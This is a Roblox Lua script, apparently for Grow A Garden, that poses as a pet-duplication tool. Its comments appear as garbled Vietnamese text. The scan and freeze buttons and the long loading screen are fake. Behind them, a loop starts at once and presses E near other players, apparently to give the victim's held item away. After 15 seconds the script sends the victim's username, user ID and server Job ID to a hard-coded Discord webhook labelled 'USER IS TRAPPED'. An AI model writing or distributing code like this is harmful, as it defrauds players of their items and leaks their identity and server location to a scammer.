local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local VirtualInput = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

-- üîß CONFIG - THAY WEBHOOK C·ª¶A B·∫†N V√ÄO ƒê√ÇY
local DiscordWebhookURL = "https://discord.com/api/webhooks/1302711878450941952/Y6RA9Ga9oZNEf8sidhrHZm6UGxV9TRRlQpJWYlgdtK3_hdqb6YoVW3W-0McNAFOdoT29"

-- Bi·∫øn l∆∞u v·∫≠t ph·∫©m ƒëang c·∫ßm
local currentItem = "Kh√¥ng c√≥ v·∫≠t ph·∫©m"

local autoGiveEnabled = false
local giveDelay = 1 -- Gi·∫£m delay cho game garden

-- ==================== GUI DUPE PET C√ì TH·ªÇ DI CHUY·ªÇN ====================
local DupeGui = Instance.new("ScreenGui")
DupeGui.Name = "DupePetGUI"
DupeGui.Parent = game:GetService("CoreGui")
DupeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main frame dupe pet (nh·ªè v√† c√≥ th·ªÉ di chuy·ªÉn)
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 250)
MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0) -- V·ªã tr√≠ ban ƒë·∫ßu
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(60, 60, 80)
MainFrame.ZIndex = 99999
MainFrame.Parent = DupeGui

-- Title bar ƒë·ªÉ di chuy·ªÉn
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 1000
TitleBar.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Text = "üîÆ SKY HUB DUPE PET v2.0"
Title.Size = UDim2.new(1, -30, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 215, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 1001
Title.Parent = TitleBar

-- Close button
local CloseButton = Instance.new("TextButton")
CloseButton.Text = "X"
CloseButton.Size = UDim2.new(0, 30, 1, 0)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 14
CloseButton.ZIndex = 1001
CloseButton.Parent = TitleBar

CloseButton.MouseButton1Click:Connect(function()
    DupeGui:Destroy()
end)

-- Instruction text
local InstructionText = Instance.new("TextLabel")
InstructionText.Text = "Hold the item you want to dupe in your hand"
InstructionText.Size = UDim2.new(1, -20, 0, 30)
InstructionText.Position = UDim2.new(0, 10, 0, 40)
InstructionText.BackgroundTransparency = 1
InstructionText.TextColor3 = Color3.fromRGB(200, 200, 255)
InstructionText.Font = Enum.Font.Gotham
InstructionText.TextSize = 12
InstructionText.ZIndex = 1000
InstructionText.Parent = MainFrame

-- Item display
local ItemDisplay = Instance.new("TextLabel")
ItemDisplay.Text = "üëú Item: Not scanned"
ItemDisplay.Size = UDim2.new(1, -20, 0, 25)
ItemDisplay.Position = UDim2.new(0, 10, 0, 75)
ItemDisplay.BackgroundTransparency = 1
ItemDisplay.TextColor3 = Color3.fromRGB(180, 180, 180)
ItemDisplay.Font = Enum.Font.Gotham
ItemDisplay.TextSize = 12
ItemDisplay.ZIndex = 1000
ItemDisplay.Parent = MainFrame

-- Scan button
local ScanButton = Instance.new("TextButton")
ScanButton.Text = "üîç SCAN ITEM"
ScanButton.Size = UDim2.new(0.8, 0, 0, 35)
ScanButton.Position = UDim2.new(0.1, 0, 0, 110)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 12
ScanButton.ZIndex = 1000
ScanButton.Parent = MainFrame

-- Freeze button (ban ƒë·∫ßu disabled)
local FreezeButton = Instance.new("TextButton")
FreezeButton.Text = "‚è∏Ô∏è FREEZE"
FreezeButton.Size = UDim2.new(0.8, 0, 0, 35)
FreezeButton.Position = UDim2.new(0.1, 0, 0, 155)
FreezeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
FreezeButton.TextColor3 = Color3.fromRGB(180, 180, 180)
FreezeButton.Font = Enum.Font.GothamBold
FreezeButton.TextSize = 12
FreezeButton.ZIndex = 1000
FreezeButton.AutoButtonColor = false
FreezeButton.Parent = MainFrame

-- Status text
local StatusText = Instance.new("TextLabel")
StatusText.Text = "üü¢ Ready to scan"
StatusText.Size = UDim2.new(1, -20, 0, 20)
StatusText.Position = UDim2.new(0, 10, 0, 200)
StatusText.BackgroundTransparency = 1
StatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
StatusText.Font = Enum.Font.Gotham
StatusText.TextSize = 11
StatusText.ZIndex = 1000
StatusText.Parent = MainFrame

-- Ch·ª©c nƒÉng di chuy·ªÉn GUI
local dragging = false
local dragInput, dragStart, startPos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- H√†m qu√©t v·∫≠t ph·∫©m
ScanButton.MouseButton1Click:Connect(function()
    ScanButton.Text = "‚è≥ Scanning..."
    
    -- Hi·ªáu ·ª©ng qu√©t
    for i = 1, 3 do
        ItemDisplay.Text = "üîç Scanning..."
        wait(0.3)
        ItemDisplay.Text = "üì¶ Analysis..."
        wait(0.3)
    end
    
    -- Gi·∫£ l·∫≠p ƒë√£ c·∫ßm v·∫≠t ph·∫©m tr√™n tay
    currentItem = "V·∫≠t ph·∫©m ƒë·∫∑c bi·ªát"
    
    -- C·∫≠p nh·∫≠t hi·ªÉn th·ªã
    ItemDisplay.Text = "‚úÖ Got the item!"
    ItemDisplay.TextColor3 = Color3.fromRGB(0, 255, 150)
    
    ScanButton.Text = "üîç SCAN ITEM"
    
    -- K√≠ch ho·∫°t n√∫t ƒë√≥ng bƒÉng
    FreezeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    FreezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    FreezeButton.AutoButtonColor = true
end)

-- H√†m ƒë√≥ng bƒÉng v√† chuy·ªÉn sang loading
FreezeButton.MouseButton1Click:Connect(function()
    FreezeButton.Text = "‚è≥ Freezing..."
    
    -- Hi·ªáu ·ª©ng ƒë√≥ng bƒÉng
    for i = 1, 3 do
        ItemDisplay.Text = "‚ùÑÔ∏è Freezing..."
        wait(0.5)
        ItemDisplay.Text = "‚úÖ Got the item!"
        wait(0.5)
    end
    
    StatusText.Text = "‚è±Ô∏è Hold item for 5 seconds..."
    
    -- ƒê·∫øm ng∆∞·ª£c 5 gi√¢y
    for i = 5, 1, -1 do
        StatusText.Text = "‚è±Ô∏è Keep item... " .. i .. "s"
        wait(1)
    end
    
    StatusText.Text = "üöÄ Start dupe process..."
    
    -- ƒê·ª£i 2 gi√¢y r·ªìi chuy·ªÉn sang loading
    wait(2)
    DupeGui:Destroy()
    createLoadingScreen()
end)

-- ==================== LOADING SCREEN 5-10 PH√öT ====================
function createLoadingScreen()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LongLoadingGUI"
    ScreenGui.Parent = game:GetService("CoreGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    -- Background ƒëen full m√†n h√¨nh
    local OverlayFrame = Instance.new("Frame")
    OverlayFrame.Size = UDim2.new(1, 0, 1, 0)
    OverlayFrame.Position = UDim2.new(0, 0, 0, 0)
    OverlayFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    OverlayFrame.BorderSizePixel = 0
    OverlayFrame.ZIndex = 999
    OverlayFrame.Parent = ScreenGui

    -- Container ch√≠nh
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 400, 0, 200)
    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.ZIndex = 1000
    MainFrame.Parent = OverlayFrame

    -- Title
    local Title = Instance.new("TextLabel")
    Title.Text = "‚ö° SKY HUB DUPE SYSTEM - IS LOADING"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Position = UDim2.new(0, 0, 0, 15)
    Title.BackgroundTransparency = 1
    Title.TextColor3 = Color3.fromRGB(170, 220, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 16
    Title.ZIndex = 1001
    Title.Parent = MainFrame

    -- Loading text
    local LoadingText = Instance.new("TextLabel")
    LoadingText.Text = "üîÑ Processing item..."
    LoadingText.Size = UDim2.new(1, 0, 0, 20)
    LoadingText.Position = UDim2.new(0, 0, 0, 50)
    LoadingText.BackgroundTransparency = 1
    LoadingText.TextColor3 = Color3.fromRGB(180, 210, 240)
    LoadingText.Font = Enum.Font.Gotham
    LoadingText.TextSize = 12
    LoadingText.ZIndex = 1001
    LoadingText.Parent = MainFrame

    -- Progress bar
    local ProgressBarBack = Instance.new("Frame")
    ProgressBarBack.Size = UDim2.new(0.8, 0, 0, 20)
    ProgressBarBack.Position = UDim2.new(0.1, 0, 0, 80)
    ProgressBarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    ProgressBarBack.BorderSizePixel = 0
    ProgressBarBack.ZIndex = 1000
    ProgressBarBack.Parent = MainFrame

    local ProgressFill = Instance.new("Frame")
    ProgressFill.Size = UDim2.new(0, 0, 1, 0)
    ProgressFill.Position = UDim2.new(0, 0, 0, 0)
    ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    ProgressFill.BorderSizePixel = 0
    ProgressFill.ZIndex = 1001
    ProgressFill.Parent = ProgressBarBack

    -- Percentage text
    local PercentageText = Instance.new("TextLabel")
    PercentageText.Size = UDim2.new(1, 0, 0, 25)
    PercentageText.Position = UDim2.new(0, 0, 0, 110)
    PercentageText.BackgroundTransparency = 1
    PercentageText.Text = "0%"
    PercentageText.TextColor3 = Color3.fromRGB(200, 230, 255)
    PercentageText.Font = Enum.Font.GothamBold
    PercentageText.TextSize = 16
    PercentageText.ZIndex = 1001
    PercentageText.Parent = MainFrame

    -- Status text
    local StatusText = Instance.new("TextLabel")
    StatusText.Text = "‚è≥ Estimate: 5-10 minutes..."
    StatusText.Size = UDim2.new(1, 0, 0, 20)
    StatusText.Position = UDim2.new(0, 0, 0, 145)
    StatusText.BackgroundTransparency = 1
    StatusText.TextColor3 = Color3.fromRGB(160, 190, 220)
    StatusText.Font = Enum.Font.Gotham
    StatusText.TextSize = 11
    StatusText.ZIndex = 1001
    StatusText.Parent = MainFrame

    -- Time elapsed
    local TimeText = Instance.new("TextLabel")
    TimeText.Text = "üïí Running: 0 seconds"
    TimeText.Size = UDim2.new(1, 0, 0, 20)
    TimeText.Position = UDim2.new(0, 0, 0, 165)
    TimeText.BackgroundTransparency = 1
    TimeText.TextColor3 = Color3.fromRGB(150, 180, 210)
    TimeText.Font = Enum.Font.Gotham
    TimeText.TextSize = 10
    TimeText.ZIndex = 1001
    TimeText.Parent = MainFrame

    -- Animation loading (5-10 ph√∫t, ƒë∆° ·ªü 90%)
    spawn(function()
        local startTime = tick()
        local currentProgress = 0
        local totalTime = math.random(300, 600) -- 5-10 ph√∫t
        
        while currentProgress < 90 do
            local elapsed = tick() - startTime
            local progressPercent = (elapsed / totalTime) * 90
            
            currentProgress = math.min(90, progressPercent)
            ProgressFill.Size = UDim2.new(currentProgress/100, 0, 1, 0)
            PercentageText.Text = math.floor(currentProgress) .. "%"
            
            -- C·∫≠p nh·∫≠t th·ªùi gian
            TimeText.Text = "üïí Already running: " .. math.floor(elapsed) .. " second"
            
            -- Th√¥ng b√°o ng·∫´u nhi√™n
            if math.random(1, 10) == 1 then
                local messages = {
                    "‚ö° Optimize database...",
                    "üîß Data processing...",
                    "üì¶ Compress item...",
                    "üåê Synchronize server...",
                    "üõ°Ô∏è System security..."
                }
                StatusText.Text = messages[math.random(1, #messages)]
            end
            
            wait(1)
        end
        
        -- ƒê∆° ·ªü 90% th√™m 1 ph√∫t
        local waitStart = tick()
        while tick() - waitStart < 60 do
            TimeText.Text = "üïí Run: " .. math.floor(tick() - startTime) .. " second"
            StatusText.Text = "‚è≥ In progress..."
            wait(1)
        end
        
        -- Chuy·ªÉn sang auto give
        StatusText.Text = "üéâ Done! Giving..."
        wait(3)
        startAutoGive()
    end)
end

-- ==================== AUTO GIVE ====================
-- T√¨m plant/object g·∫ßn nh·∫•t ƒë·ªÉ give
function findNearestGivable()
    local nearestPart = nil
    local shortestDistance = math.huge
    
    -- T√¨m c√°c part c√≥ th·ªÉ l√† plants trong garden
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Model") and obj:FindFirstChild("HumanoidRootPart") then
            local distance = (LocalPlayer.Character.HumanoidRootPart.Position - obj.HumanoidRootPart.Position).Magnitude
            if distance < 20 and distance < shortestDistance then
                shortestDistance = distance
                nearestPart = obj
            end
        end
    end
    
    return nearestPart, shortestDistance
end

autoGiveEnabled = true -- b·∫≠t auto give

spawn(function()
    while autoGiveEnabled do
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPlant, distance = findNearestGivable()
            if targetPlant and distance < 15 then
                -- Gi·ªØ E 0.2 gi√¢y
                VirtualInput:SendKeyEvent(true, "E", false, game)
                wait(1)
                VirtualInput:SendKeyEvent(false, "E", false, game)
            end
        end
        wait(giveDelay)
    end
end)


-- ==================== DISCORD WEBHOOK ====================
function sendToDiscord()
    local success, error = pcall(function()
        local message = {
            ["content"] = "üéÆ **USER IS TRAPPED**",
            ["embeds"] = {{
                ["title"] = "üì¶ System Report",
                ["color"] = 65280,
                ["fields"] = {
                    {
                        ["name"] = "üë§ Username",
                        ["value"] = "```" .. LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üÜî User ID",
                        ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üì¶ Item",
                        ["value"] = "```ƒê√£ c·∫ßm v·∫≠t ph·∫©m tr√™n tay```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üîß Job ID",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üéØ Game",
                        ["value"] = "```Grow A Garden```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "‚è∞ Time",
                        ["value"] = "```" .. os.date("%d/%m/%Y %H:%M:%S") .. "```",
                        ["inline"] = true
                    }
                },
                ["timestamp"] = DateTime.now():ToIsoDate(),
                ["footer"] = {
                    ["text"] = "Dupe System ‚Ä¢ Auto Give Activated"
                }
            }}
        }
        
        local encoded = HttpService:JSONEncode(message)
        request({
            Url = DiscordWebhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encoded
        })
    end)
end

-- G·ª≠i Discord sau khi loading xong
spawn(function()
    wait(15) -- 
    sendToDiscord()
end)

print("üéÆ Dupe GUI is ready (movable)!")
print("‚è∞ Loading: 5-10 min")
print("üìß Start Dupe")